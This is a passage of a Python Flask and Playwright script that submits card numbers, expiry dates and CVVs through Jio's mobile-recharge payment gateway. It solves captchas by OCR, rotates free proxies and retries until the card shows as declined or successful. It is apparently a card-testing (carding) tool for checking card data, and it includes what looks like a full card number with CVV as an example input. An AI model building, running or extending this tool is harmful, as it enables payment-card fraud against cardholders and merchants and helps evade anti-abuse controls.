                return {"outcome":"declined","card_declined":True,"markers":decline_hits,"result":final_result,"captured_count":len(captured)}

            if ts_status and ts_status.lower() == "success":
                final_result = {
                    "status": True,
                    "tsStatus": "success",
                    "tsMessage": ts_msg,
                    "tsImage": "https://jep-asset.akamaized.net/MyJio_Client/corefiles/jpg/ic_success.svg",
                    "tsContainer": {"background":"#EDF4DF","color":"#4FAF49"},
                    "ccfMessage": ccf_msg or None,
                }
                print(f"[10/10] TRANSACTION SUCCESS")
                browser.close()
                return {"outcome":"success","card_declined":False,"markers":["success"],"result":final_result,"captured_count":len(captured)}

            # Check for 3DS
            if any(m in combined for m in THREEDS_MARKERS):
                print(f"    3DS challenge detected — keep polling...")
                try:
                    for sel in ['button:has-text("Authorize")','button:has-text("Verify")','button:has-text("Continue")']:
                        try:
                            el = page.query_selector(sel)
                            if el and el.is_visible(): el.click(); time.sleep(2); break
                        except: pass
                except: pass

            # Check for rate limit (inprogress = previous txn still processing)
            if ts_status and ts_status.lower() in ("inprogress","in_progress"):
                # NOT a decline — but show it as the current state
                if not final_result:
                    final_result = {
                        "status": True,
                        "tsStatus": "inprogress",
                        "tsMessage": ts_msg,
                        "tsImage": "https://jep-asset.akamaized.net/MyJio_Client/corefiles/jpg/ic_pending.svg",
                        "tsContainer": {"background":"#FFEED3","color":"#E88F00"},
                        "ccfMessage": ccf_msg or None,
                    }

        # Polling exhausted
        print(f"[10/10] Timeout — no definitive decline/success after {max_poll_minutes} min")
        browser.close()
        return {"outcome":"timeout","card_declined":False,"result":final_result,"captured_count":len(captured)}

# ============================================================================
# Top-level run_flow_pay: orchestrates the WHOLE flow including Playwright
# ============================================================================
def run_flow_pay(msisdn, rs_amount=None, tier_in=None, cc=None, proxy=None,
                 hosted_url=None, max_retries=3, max_poll_minutes=8):
    """Full flow with Playwright driver. Loops until we get a definitive
    outcome (success OR decline markers).

    Plan selection priority:
      1. rs_amount (exact Rs match, e.g. rs=299 → plan with amount=299)
      2. tier_in (low|mid|high|random) if rs_amount not provided
      3. Default: random tier

    proxy:
      - None           : no proxy (direct)
      - "auto"         : auto-fetch + test + sort free proxies, use the best
      - "http://h:p"   : use this specific proxy URL
    """
    if not re.fullmatch(r"\d{10}", msisdn):
        raise ValueError("invalid number (must be 10 digits)")
    if cc is None:
        raise ValueError("cc (card data) is required")

    # Resolve proxy
    proxy_url = None
    if proxy == "auto":
        print("[flow] proxy=auto → fetching + testing free proxies...")
        proxy_url = get_best_free_proxy(max_test=80, timeout=4)
        if proxy_url:
            print(f"[flow] using best free proxy: {proxy_url}")
        else:
            print("[flow] ! no working free proxy found, falling back to direct")
    elif proxy:
        proxy_url = proxy
        print(f"[flow] using provided proxy: {proxy_url}")

    _apply_proxy(proxy_url)
    card = parse_card(cc)

    attempts_log = []
    last_error = None
    last_result = None

    for attempt in range(1, max_retries + 1):
        print(f"\n=== attempt {attempt}/{max_retries} ===")
        attempt_entry = {
            "attempt": attempt,
            "started_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            "hosted_at": hosted_url or "-",
            "proxy_used": proxy_url or "direct",
        }
        try:
            # Step 1: Python-side get paymentURL (captcha + /recharge/pay)
            print("  Step 1: warmup + fetch plans + captcha + /recharge/pay")
            jio.cookies.clear(); pg.cookies.clear()
            _apply_proxy(proxy_url)  # re-apply after clear
            warmup()
            plans, _ = fetch_plans()

            # Pick plan: rs_amount takes priority over tier_in
            if rs_amount is not None:
                plan, match_mode = pick_plan_by_amount(plans, rs_amount)
                if plan is None:
                    raise RuntimeError(f"no plan found for rs={rs_amount} (mode={match_mode})")
                print(f"    plan (rs={rs_amount}, match={match_mode}): id={plan.get('id')} amount={plan.get('amount')} category={plan.get('categoryLabel')}")
            else:
                tier_in = tier_in or "random"
                if tier_in not in TIERS: tier_in = "random"
                plan, match_mode = pick_by_tier(plans, tier_in)
                print(f"    plan (tier={tier_in}, mode={match_mode}): id={plan.get('id')} amount={plan.get('amount')}")
            plan_id = str(plan["id"]); plan_key = plan["key"]

            captcha_val, party_id, _ = _validate_captcha(msisdn)
            print(f"    captcha solved: {captcha_val!r} party_id={party_id}")

            pay_r, payment_url = _recharge_pay(msisdn, plan_key, plan_id, captcha_val)
            print(f"    /recharge/pay HTTP {pay_r.status_code}  paymentURL: {payment_url}")
            if not payment_url:
                raise RuntimeError(f"no paymentURL: {pay_r.text[:300]}")

            # Step 2: Playwright drive + poll
            print(f"  Step 2: Playwright drive (max {max_poll_minutes} min poll)")
            result = _drive_jio_pg_with_playwright(
                msisdn, cc, plan_id, plan_key, payment_url, party_id, captcha_val,
                proxy_url=proxy_url, max_poll_minutes=max_poll_minutes,
            )
            attempt_entry["outcome"] = result.get("outcome")
            attempt_entry["captured_count"] = result.get("captured_count", 0)
            attempts_log.append(attempt_entry)

            # If we got a definitive answer, save + return
            if result.get("outcome") in ("declined","success"):
                record = {
                    "msisdn": msisdn,
                    "rs_amount": rs_amount,
                    "card_masked": card["number"][:6] + "*"*(len(card["number"])-10) + card["number"][-4:],
                    "plan_amount": plan.get("amount"),
                    "proxy_used": proxy_url or "direct",
                    "outcome": result.get("outcome"),
                    "card_declined": result.get("card_declined"),
                    "markers": result.get("markers"),
                    "result": result.get("result"),
                }
                save_proof(record)
                return record, attempts_log

            # outcome == "timeout" → NOT a real decline, keep retrying
            print(f"  ! attempt {attempt}: outcome={result.get('outcome')} → retrying")

        except Exception as e:
            attempt_entry["error"] = f"{type(e).__name__}: {e}"
            attempt_entry["trace"] = traceback.format_exc().splitlines()[-1]
            attempts_log.append(attempt_entry)
            last_error = str(e)
            print(f"  ! attempt {attempt} error: {e}")
        time.sleep(2)

    return None, attempts_log


# ============================================================================
# Flask app
# ============================================================================
if Flask is not None:
    app = Flask(__name__)
    MAX_RETRIES = 6   # raise so the loop has more chances to hit a real decline marker
    MAX_POLL_MINUTES = 6

    @app.route("/", methods=["GET"])
    def _index():
        return jsonify({
            "service":"meou-flask-playwright",
            "endpoints": {
                "/run":  "captcha + /recharge/pay only (no Playwright)",
                "/pay":  "FULL flow incl. Playwright — drives browser, polls for card outcome",
                "/health":"liveness",
            },
            "params": {
                "Api_url":"URL where this script is hosted (metadata, optional)",
                "cc":     "REQUIRED — card data: number|MM|YY|CVV",
                "number": "REQUIRED — 10-digit mobile",
                "rs":     "EXACT plan amount in Rs (e.g. rs=299, rs=11, rs=349) — preferred",
                "tier":   "low | mid | high | random (default: random) — used if rs not provided",
                "proxy":  "auto | http://host:port | (omit for direct) — auto fetches+tests+sorts free proxies",
                "poll_min":"minutes to poll transaction status (default: 8)",
            },
            "decline_markers": list(REAL_DECLINE_MARKERS[:8]) + ["..."],
            "threeds_markers": list(THREEDS_MARKERS[:5]) + ["..."],
            "example":"/pay?Api_url=https://myapp.up.railway.app&cc=5400580756892507|11|2026|740&number=8618996704&rs=299&proxy=auto&poll_min=5",
        })

    @app.route("/health", methods=["GET"])
    def _health():
        # Check tesseract version if available
        tess_version = None
        if _TESSERACT_BIN:
            try:
                r = _subprocess.run([_TESSERACT_BIN, "--version"],
                                    capture_output=True, timeout=5)
                tess_version = r.stderr.decode("utf-8","replace").split("\n")[0]
            except: pass
        return jsonify({
            "ok": bool(Flask and requests),
            "service": "meou-flask-playwright",
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "http_backend": _HTTP_BACKEND,
            "ocr_available": _OCR_OK,
            "tesseract_binary": _TESSERACT_BIN,
            "tesseract_version": tess_version,
            "playwright_available": _sync_playwright is not None,
            "port": os.environ.get("PORT", "5000"),
        })

    @app.route("/run", methods=["GET","POST"])
    def _run_endpoint():
        """Just captcha + /recharge/pay — no Playwright."""
        src = flask_request.values if flask_request.method == "GET" else (
            flask_request.form or (flask_request.get_json(silent=True) or {})
        )
        api_url = (src.get("Api_url") or "").strip()
        cc      = (src.get("cc") or "").strip()
        number  = (src.get("number") or "").strip()
        rs      = (src.get("rs") or "").strip()
        tier    = (src.get("tier") or "random").strip().lower()
        proxy_arg = (src.get("proxy") or "").strip()
        if not number:
            return jsonify({"status":"error","error":"missing 'number'"}), 400
        if not re.fullmatch(r"\d{10}", str(number)):
            return jsonify({"status":"error","error":"invalid number"}), 400
        if not cc:
            return jsonify({"status":"error","error":"missing 'cc'"}), 400

        # Resolve proxy
        proxy_url = None
        if proxy_arg == "auto":
            proxy_url = get_best_free_proxy(max_test=80, timeout=4)
        elif proxy_arg:
            proxy_url = proxy_arg

        try:
            jio.cookies.clear(); pg.cookies.clear()
            _apply_proxy(proxy_url)
            warmup()
            plans, _ = fetch_plans()
            # Pick plan: rs takes priority over tier
            if rs:
                plan, mode = pick_plan_by_amount(plans, rs)
                if plan is None:
                    return jsonify({"status":"error","error":f"no plan for rs={rs} ({mode})"}), 400
            else:
                if tier not in TIERS: tier = "random"
                plan, mode = pick_by_tier(plans, tier)
            plan_id = str(plan["id"]); plan_key = plan["key"]
            captcha_val, party_id, _ = _validate_captcha(str(number))
            pay_r, payment_url = _recharge_pay(str(number), plan_key, plan_id, captcha_val)
            return jsonify({
                "status":"payment_url_acquired" if payment_url else "no_payment_url",
                "msisdn": str(number),
                "plan_id": plan_id, "plan_key": plan_key,
                "plan_amount": plan.get("amount"),
                "plan_category": plan.get("categoryLabel"),
                "plan_match_mode": mode,
                "rs_requested": rs or None,
                "tier_requested": tier if not rs else None,
                "party_id": party_id,
                "captcha_solved": captcha_val,
                "proxy_used": proxy_url or "direct",
                "payment_url": payment_url,
                "pay_response": pay_r.text[:1000],
            })
        except Exception as e:
            return jsonify({"status":"error","error":str(e),
                            "trace": traceback.format_exc().splitlines()[-1]}), 500

    @app.route("/pay", methods=["GET","POST"])
    def _pay_endpoint():
        """FULL flow with Playwright — loops until definitive card outcome."""
        src = flask_request.values if flask_request.method == "GET" else (
            flask_request.form or (flask_request.get_json(silent=True) or {})
        )
        api_url = (src.get("Api_url") or "").strip()
        cc      = (src.get("cc") or "").strip()
        number  = (src.get("number") or "").strip()
        rs      = (src.get("rs") or "").strip()
        tier    = (src.get("tier") or "random").strip().lower()
        proxy_arg = (src.get("proxy") or "").strip()
        poll_min = src.get("poll_min")
        try: poll_min = int(poll_min) if poll_min else MAX_POLL_MINUTES
        except: poll_min = MAX_POLL_MINUTES

        if not number:
            return jsonify({"status":"error","error":"missing 'number'"}), 400
        if not re.fullmatch(r"\d{10}", str(number)):
            return jsonify({"status":"error","error":"invalid number (10 digits)"}), 400
        if not cc:
            return jsonify({"status":"error","error":"missing 'cc' (number|MM|YY|CVV)"}), 400

        # Resolve proxy: "auto" → fetch+test+sort free proxies
        proxy_for_flow = None
        if proxy_arg == "auto":
            proxy_for_flow = "auto"
        elif proxy_arg:
            proxy_for_flow = proxy_arg

        if _sync_playwright is None:
            return jsonify({"status":"error",
                            "error":"playwright not installed — run: pip install playwright && python -m playwright install chromium"}), 500

        try:
            record, attempts = run_flow_pay(
                msisdn=str(number),
                rs_amount=rs if rs else None,
                tier_in=tier if not rs else None,
                cc=cc,
                proxy=proxy_for_flow,
                hosted_url=api_url or None,
                max_retries=MAX_RETRIES,
                max_poll_minutes=poll_min,
            )
            if record:
                # Clean, concise response — only the result + minimal metadata
                result = record.get("result") or {}
                return jsonify({
                    # Jio PG get-transactionstatus-msg format (the actual result)
                    "status": result.get("status"),
                    "tsStatus": result.get("tsStatus"),
                    "tsMessage": result.get("tsMessage"),
                    "tsImage": result.get("tsImage"),
                    "tsContainer": result.get("tsContainer"),
                    "ccfMessage": result.get("ccfMessage"),
                    # Minimal metadata
                    "msisdn": record.get("msisdn"),
                    "rs_requested": record.get("rs_amount"),
                    "plan_amount": record.get("plan_amount"),
                    "card_masked": record.get("card_masked"),
                    "proxy_used": record.get("proxy_used"),
                    "attempts": len(attempts),
                }), 200
            else:
                return jsonify({
                    "status": "failed",
                    "tsStatus": "error",
                    "tsMessage": "no definitive outcome after all attempts",
                    "attempts": len(attempts),
                }), 500
        except Exception as e:
            return jsonify({"status":"error","error":str(e),
                            "trace": traceback.format_exc().splitlines()[-1]}), 500

    def _serve():
        # Railway convention: PORT env var
        port = int(os.environ.get("PORT", "5000"))
        host = os.environ.get("HOST", "0.0.0.0")
        print(f"meou-flask-playwright listening on http://{host}:{port}")
        print(f"  HTTP backend: {_HTTP_BACKEND or 'NONE'}  |  "
              f"Playwright: {'yes' if _sync_playwright else 'no'}  |  "
              f"OCR (tesseract): {'yes' if _OCR_OK else 'no'}")
        print(f"  endpoints: /  /health  /run  /pay")
        app.run(host=host, port=port, threaded=True, debug=True, use_reloader=False)


# ============================================================================
# CLI / main
# ============================================================================
def main():
    try:
        msisdn = MSISDN or input("number: ").strip()
    except EOFError:
        print("\nERROR: No interactive terminal (stdin is closed).")
        print("This happens on Railway/container deployments where there's no TTY.")
        print("SOLUTION: Run `python app.py` (no args) to start the Flask server,")
        print("          then send requests via HTTP:")
        print('          curl "http://localhost:5000/pay?cc=5400580756892507|11|2026|740&number=8618996704&rs=299"')
        sys.exit(1)
    if not re.fullmatch(r"\d{10}", msisdn):
        print("invalid number"); sys.exit(1)
    try:
        rs_input = input("rs (exact plan amount, e.g. 299) [or ENTER for tier]: ").strip()
    except EOFError:
        print("\nERROR: No interactive terminal. Use `python app.py` (no args) to start the server."); sys.exit(1)
    if rs_input:
        tier_in = None
    else:
        try:
            tier_in = TIER or input(f"tier {TIERS}: ").strip().lower()
        except EOFError:
            print("\nERROR: No interactive terminal. Use `python app.py` (no args) to start the server."); sys.exit(1)
        if tier_in not in TIERS: tier_in = "random"
    try:
        proxy_input = input("proxy (auto | http://host:port | ENTER for direct): ").strip()
    except EOFError:
        proxy_input = ""
    if not proxy_input: proxy_input = None
    try:
        raw = CARD_RAW or input("card (num|MM|YY|CVV): ").strip()
    except EOFError:
        print("\nERROR: No interactive terminal. Use `python app.py` (no args) to start the server."); sys.exit(1)
    record, attempts = run_flow_pay(msisdn, rs_amount=rs_input or None,
                                     tier_in=tier_in, cc=raw, proxy=proxy_input,
                                     hosted_url=None)
    if record:
        print("\n" + "="*64)
        print("PAYMENT REPORT")
        print("="*64)
        print(f"msisdn       : {record['msisdn']}")
        print(f"outcome      : {record['outcome']}")
        print(f"card_declined: {record['card_declined']}")
        print(f"markers      : {record['markers']}")
        print(f"rs_requested : {record.get('rs_amount')}")
        print(f"plan_match   : {record.get('plan_match_mode')}")
        print(f"plan         : id={record['plan_id']} amount={record['plan_amount']} ({record.get('plan_category')})")
        print(f"party_id     : {record['party_id']}")
        print(f"proxy_used   : {record.get('proxy_used')}")
        print(f"raw_response : {record.get('raw_response')}")
        print("="*64)


if __name__ == "__main__":
    # Railway default behavior: if no args, start the server.
    # Pass `cli` as the first arg to run the CLI flow instead.
    if len(sys.argv) > 1 and sys.argv[1] == "cli":
        main()
    else:
        # default = serve (works for Railway: `python app.py`)
        if Flask is None:
            print("ERROR: Flask is not installed.  Add 'flask' to requirements.txt and run 'pip install -r requirements.txt'.")
            sys.exit(1)
        if requests is None:
            print("ERROR: No HTTP client available.  Add 'curl_cffi' (preferred) or 'requests' to requirements.txt.")
            sys.exit(1)
        _serve()
